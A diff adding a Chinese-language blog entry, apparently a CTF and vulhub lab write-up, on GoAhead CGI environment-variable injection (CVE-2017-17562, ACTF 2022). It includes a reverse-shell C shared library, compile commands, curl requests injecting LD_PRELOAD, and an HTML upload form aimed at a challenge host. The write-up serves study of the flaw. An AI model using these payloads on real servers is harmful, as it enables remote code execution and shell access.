@@ -368,6 +368,78 @@
       </tags>
   </entry>
   <entry>
+    <title>goahead环境变量注入</title>
+    <url>/2022/06/30/goahead%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="Goahead环境变量注入"><a href="#Goahead环境变量注入" class="headerlink" title="Goahead环境变量注入"></a>Goahead环境变量注入</h1><h2 id="CVE-2017-17562"><a href="#CVE-2017-17562" class="headerlink" title="CVE-2017-17562"></a>CVE-2017-17562</h2><h2 id="Goahead"><a href="#Goahead" class="headerlink" title="Goahead"></a>Goahead</h2><p>GoAhead Web Server，它是一个开源（商业许可）、简单、轻巧、功能强大、可以在多个平台运行的嵌入式Web Server。</p>
+<p>GoAhead Web Server是跨平台的服务器软件，可以稳定地运行在Windows，Linux和Mac OS X操作系统之上。GoAhead Web Server是开放源代码的，这意味着你可以随意修改Web服务器的功能。这款WEB服务器非常小巧，它的WIN CE版本编译后的大小还不到60k，它的输出通常也是面向一些小屏幕设备。在性能方面，使用一颗24MH z的68040处理器，它的响应速度为20次/秒，使用266MHz的Pentium处理器可以达到50次/秒的响应速度。</p>
+<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p><strong>GoAhead Web Server &lt; 3.6.5</strong></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这个漏洞出现在goahead/src/cgi.c:cgihandler函数中 它使用http请求参数中的键值对来初始化新进程的envp参数（也就是会将http请求中的键值存入环境变量中） 在CVE-2017-17562中 考虑到了可能由于环境变量可控造成的注入 因此对“REMOTE_HOST”和“HTTP_AUTHORIZATION”两个环境变量进行了验证 但是没有对其他环境变量做出防范  所以可以利用LD_PRELOAD在cgi程序开始时 将恶意文件的路径指定为LD_PRELOAD的路径 从而达到在运行程序时 恶意文件中的代码被执行造成的rce 具体分析移步下面</p>
+<p><a href="https://paper.seebug.org/488/">GoAhead远程代码执行漏洞(CVE-2017-17562)分析及实战 (seebug.org)</a></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里用vulhub进行复现</p>
+<p><img src="https://s2.loli.net/2022/06/28/EfnL6kd3swuKtgl.png" alt="image-20220628134529914"></p>
+<p>容器内有一个可以利用的文件 该文件可以触发cgi进程</p>
+<p><img src="https://s2.loli.net/2022/06/28/NuDLFrXKzJdax6q.png" alt="image-20220628134625382"></p>
+<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">curl http://192.168.156.128:8080/cgi-bin/index</span><br></pre></td></tr></table></figure>
+
+<p>测试cgi页面是否能访问</p>
+<p>写一个exp.c文件</p>
+<figure class="highlight c"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *server_ip=<span class="string">&quot;攻击机ip&quot;</span>;</span><br><span class="line"><span class="type">uint32_t</span> server_port=攻击机监听端口;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">reverse_shell</span><span class="params">(<span class="type">void</span>)</span> __<span class="title function_">attribute__</span><span class="params">((constructor))</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">reverse_shell</span><span class="params">(<span class="type">void</span>)</span> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//socket initialize</span></span><br><span class="line">  <span class="type">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">attacker_addr</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  attacker_addr.sin_family = AF_INET;</span><br><span class="line">  attacker_addr.sin_port = htons(server_port);</span><br><span class="line">  attacker_addr.sin_addr.s_addr = inet_addr(server_ip);</span><br><span class="line">  <span class="comment">//connect to the server</span></span><br><span class="line">  <span class="keyword">if</span>(connect(sock, (<span class="keyword">struct</span> sockaddr *)&amp;attacker_addr,<span class="keyword">sizeof</span>(attacker_addr))!=<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="comment">//dup the socket to stdin, stdout and stderr</span></span><br><span class="line">  dup2(sock, <span class="number">0</span>);</span><br><span class="line">  dup2(sock, <span class="number">1</span>);</span><br><span class="line">  dup2(sock, <span class="number">2</span>);</span><br><span class="line">  <span class="comment">//execute /bin/sh to get a shell</span></span><br><span class="line">  execve(<span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译成恶意so </p>
+<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC ./exp.c -o exp.so</span><br></pre></td></tr></table></figure>
+
+<p>攻击机监听</p>
+<p><img src="C:/Users/86132/AppData/Roaming/Typora/typora-user-images/image-20220628135630299.png" alt="image-20220628135630299"></p>
+<p>另开一个shell向victim发送恶意so</p>
+<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">curl -X POST --data-binary @exp.so http://192.168.156.128:8080/cgi-bin/index\?LD_PRELOAD\=/proc/self/fd/0 </span><br></pre></td></tr></table></figure>
+
+<p>成功反弹shell</p>
+<h1 id="ACTF-2022-gogogo"><a href="#ACTF-2022-gogogo" class="headerlink" title="ACTF 2022 gogogo"></a>ACTF 2022 gogogo</h1><p><strong>学习链接</strong></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html">GoAhead环境变量注入复现踩坑记 | 离别歌 (leavesongs.com)</a></p>
+<p>本地把服务跑起来开始复现</p>
+<p><img src="C:/Users/86132/AppData/Roaming/Typora/typora-user-images/image-20220629215437447.png" alt="image-20220629215437447"></p>
+<p>在p神博客里可以看到这个漏洞是由于运行了cgi程序造成的环境变量注入 在官方给的源码里刚好有一个cgi程序 并且可以用来查看环境变量</p>
+<p><img src="C:/Users/86132/AppData/Roaming/Typora/typora-user-images/image-20220629215608594.png" alt="image-20220629215608594"></p>
+<p>这里利用表单发送一个文件 并且将该文件指向LD_PRELOAD  发现注入成功 证明漏洞的存在</p>
+<p><img src="C:/Users/86132/AppData/Roaming/Typora/typora-user-images/image-20220629220040171.png" alt="image-20220629220040171"></p>
+<p>所以我们要做的就是发送一个恶意文件 并且将他指向LD_PRELOAD  从而劫持系动态链接库 （在CVE-2017-17562中 是将LD_PRELIOAD指向了标准输入/proc/self/fd/0 所以如果post一个恶意的文件过去就会直接作为动态链接库的参数）</p>
+<p>但是在这个漏洞中由于上述方法被修复 所以采用发送multipart表单进行绕过</p>
+<p>但是在p神中的博客也提到了 由于环境的问题 使用multipart表单基本上是行不通的 所以采用另外一种方法</p>
+<p>先写一个payload.c文件（也可以改成弹shell的代码 但是由于环境问题弹shell成功率极低 所以选择了直接cat flag）</p>
+<figure class="highlight c"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">before_main</span><span class="params">(<span class="type">void</span>)</span> __<span class="title function_">attribute__</span><span class="params">((constructor))</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">before_main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译为恶意so插件 这里要注意由于goahead有上传大小限制 因此在编译时要用-s对so文件进行压缩</p>
+<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">gcc -s -shared -fPIC ./payload.c -o payload.so</span><br></pre></td></tr></table></figure>
+
+<p>这里上传so文件有两种方式</p>
+<ul>
+<li><p>使用shellcode</p>
+<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">curl -v -F data=@payload.so -F &quot;LD_PRELOAD=/proc/self/fd/7&quot; http://192.168.1.112:8080/cgi-bin/hello</span><br></pre></td></tr></table></figure>
+
+<p>但是使用shellcode的方法在p神博客中提到了 并且有两个问题</p>
+<ul>
+<li>我们并不知道新开启的进程进程号是多少 因此需要对每一个进程号进行爆破</li>
+<li>由于goahead在上传文件时和php类似 会先存到一个临时文件夹里并且会在上传后立刻删除 所以执行到cgi程序后进程号已经被关闭了 因此导致了劫持失败</li>
+</ul>
+<p>综合这些点shellcode并不是一个好的上传方法 所以选择下面的方法</p>
+<ul>
+<li>利用html表单进行上传</li>
+</ul>
+<p>随便去菜鸟教程扒了一个表单 记得用的时候重写以下目标ip</p>
+<figure class="highlight html"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://39.107.83.203:10218&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>利用burp拦截上传表单的数据包</p>
+<p><img src="https://raw.githubusercontent.com/y1zh3e7/image1/master/blogImg/image-20220630121225954.png" alt="image-20220630121225954"></p>
+]]></content>
+      <categories>
+        <category>网安</category>
+      </categories>
+      <tags>
+        <tag>Goahead</tag>
+        <tag>LD_PRELOAD</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>preg_match e模式下的代码执行漏洞</title>
     <url>/2022/06/09/preg-match-e%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="preg-match-e-模式下的代码执行漏洞"><a href="#preg-match-e-模式下的代码执行漏洞" class="headerlink" title="preg_match e 模式下的代码执行漏洞"></a>preg_match e 模式下的代码执行漏洞</h1><h2 id="漏洞可利用php版本"><a href="#漏洞可利用php版本" class="headerlink" title="漏洞可利用php版本"></a>漏洞可利用php版本</h2><ul>
